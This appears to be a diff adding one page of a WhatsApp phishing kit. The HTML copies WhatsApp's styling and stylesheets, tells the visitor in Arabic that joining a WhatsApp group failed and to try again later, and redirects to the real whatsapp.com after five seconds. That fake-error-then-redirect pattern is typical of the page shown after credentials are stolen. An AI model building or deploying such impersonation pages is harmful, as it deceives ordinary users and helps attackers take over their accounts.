@@ -1,0 +1,266 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Login</title>
+  <link rel="stylesheet" href="./ZEBI11/style.css">
+  <link rel="icon" href="Smoflo.png">
+  <meta http-equiv="refresh" content="5; URL= https://whatsapp.com/">
+
+  <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/yI/l/0,cross/C2fHuK6eV5E.css" data-bootloader-hash="vRp9yOm" crossorigin="anonymous" />
+  <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/yQ/l/0,cross/tkTG4LUwW7j.css" data-bootloader-hash="Dpp+Eva" crossorigin="anonymous" />
+  <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/y0/l/0,cross/cQbuIZrdEHB.css" data-bootloader-hash="X+JXpLn" crossorigin="anonymous" />
+	
+  
+  
+  
+      <style>
+        /* Style the select element */
+        .select-dropdown {
+            position: relative;
+            display: inline-block;
+            width: 200px;
+            /* Set the desired width */
+            font-family: Arial, sans-serif;
+            /* Set the desired font */
+            font-size: 14px;
+            /* Set the desired font size */
+        }
+
+        /* Style the select dropdown arrow */
+        .select-dropdown::after {
+            content: '\25BE';
+            /* Unicode character for the down arrow */
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            pointer-events: none;
+        }
+
+        /* Style the dropdown options */
+        .select-dropdown select {
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            width: 100%;
+            padding: 8px 30px 8px 10px;
+            border: 1px solid #ccc;
+            background-color: #fff;
+            cursor: pointer;
+        }
+
+        /* Style the selected option */
+        .select-dropdown select option:checked {
+            background-color: #e0e0e0;
+        }
+
+        /* Style the dropdown when it is open */
+        .select-dropdown select:focus {
+            outline: none;
+            box-shadow: 0 0 4px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Style the select element */
+        #phoneCountryCode {
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            width: 108px;
+            background-color: #f1f1f1;
+            padding: 10px;
+            font-size: 16px;
+            border-bottom: 3px solid #36ba6d;
+            border-radius: 5px;
+        }
+
+        /* Style the phone input element */
+
+        /* Style the form button */
+        button[type="submit"] {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        /* Style the form button on hover */
+        button[type="submit"]:hover {
+            background-color: #45a049;
+        }
+
+        .input-phone {
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            width: 75%;
+            font-size: 21px;
+            border-bottom: 3px solid #36ba6d;
+        }
+
+        :focus {
+            outline: none;
+
+        }
+
+
+        input::placeholder {
+
+            opacity: 75%;
+        }
+
+        ._9vcv,
+        ._advm {
+            border: none;
+        }
+
+        ul.iti__country-list>#iti-0__country-listbox {
+            list-style-type: none;
+            margin-right: -266px;
+            margin-top: 1px;
+            padding: 0;
+        }
+
+        ._9r_7 h4,
+        ._9r_7 ._7gz5,
+        ._9r_7 p,
+        ._9r_7 li,
+        ._9r_7 ol {
+            font-size: 21px;
+            line-height: 26px;
+        }
+
+        .iti--separate-dial-code .iti__selected-flag {
+            background-color: rgba(0, 0, 0, 0.05);
+            margin-right: -77px;
+            direction: ltr;
+            margin-left: 29px;
+            padding: 2px;
+        }
+
+        .iti--separate-dial-code .iti__selected-dial-code {
+            margin-left: 4px;
+        }
+
+        .iti__flag.iti__sa {
+            height: 15px;
+            background-position: -4339px 0px;
+            display: none;
+        }
+
+        input::placeholder {
+
+            opacity: 75%;
+        }
+
+        ul {
+            list-style-type: none;
+            margin-right: -200;
+            padding: 0;
+        }
+
+        .iti__country-list {
+            position: relative;
+            z-index: 2;
+            list-style: none;
+            text-align: left;
+            padding: 0;
+            margin: 0 0 -5px 23px;
+            box-shadow: 1px 1px 4px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            border: 1px solid #CCC;
+            white-space: nowrap;
+            max-height: 200px;
+            overflow-y: scroll;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        #phone::placeholder {
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .code-input-container {
+            display: flex;
+        }
+
+        .code-input {
+            border-top: none;
+            border-right: none;
+            border-left: none;
+            border-bottom: 3px solid #36ba6d;
+            direction: ltr;
+            background-color: #f1f1f1;
+            width: 40px;
+            height: 40px;
+            font-size: 18px;
+            text-align: center;
+            margin-right: 5px;
+        }
+        .btn.btn-default {
+  background-color: #fff;
+  color: #333;
+  border: 1px solid #ccc;
+  padding: 10px 20px;
+  border: none;
+  font-size: 14px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  cursor: pointer;
+}
+
+.btn.btn-default:hover {
+  background-color: #e0e0e0;
+}
+
+.btn.btn-default:active {
+  background-color: #d0d0d0;
+}
+
+.btn.btn-default:focus {
+  outline: none;
+  box-shadow: none;
+}
+
+    </style>
+  
+</head>
+
+<header class="_af-2 _afwk" data-testid="whatsapp_www_header" id="u_0_0_J5" style="background: #fcf5eb;">
+    <div class="_afvx">
+        <div class="_afvy">
+            <div class="_af8g"><button aria-label="فتح قائمة الهاتف المحمول" class="_afvu _ain3 _9vcv" id="u_0_1_uK"><span class="_advp _aeam"><img  src="Minnu.png"></span></button>
+          
+          
+            </div>
+        </div><span class="_afwd"><a data-testid="whatsapp_www_header_logo_link" href="#" class="_9vcv" data-ms="{&quot;creative&quot;:&quot;link&quot;}"><span class="_advp _aeam">
+        </nav>
+        <div class="_agga"><span class="_ag1l">
+        <span class="AA" style=" width: max-content; padding: 100px; ">
+        <a href="#" class="_9vd5 _aens _afod" target="_self"><span><span class="_afog"><span class="_9vg3 _aj1b" >
+                                    </span></span></span></a></span><a href="#" class="_aeo8 _9vcv _9u4o _9u4i" data-ms="{&quot;creative&quot;:&quot;link&quot;}"><span class="_advp _aeam"></span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="">
+                            
+                        </svg></span></a></span><a href="#" aria-label="" class="_afwh _adie _adif"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _adid _afbl">
+                    
+                </svg></a></div>
+    </div>
+</header>
+
+<body style=" background-color: #fcf5eb; ">
+
+<div class="container" style=" margin-block: 100px; ">
+  <div style=" text-align: center; margin: 20px;">
+  <img class="_9vx6" src="https://i.pinimg.com/474x/d2/b0/10/d2b01052124d637b98d00d0e595b8965.jpg">
+  <h4 class="_9vd5 _9scb" style="color:#5E5E5E; font-size: large;">لم يتم الانضمام الى مجموعة واتساب بشكل ناجح <br> المرجوا اعادة المحاولة في وقت اخر</h4>
+  </div>
+</div>
+
+
+</body>
+</html>
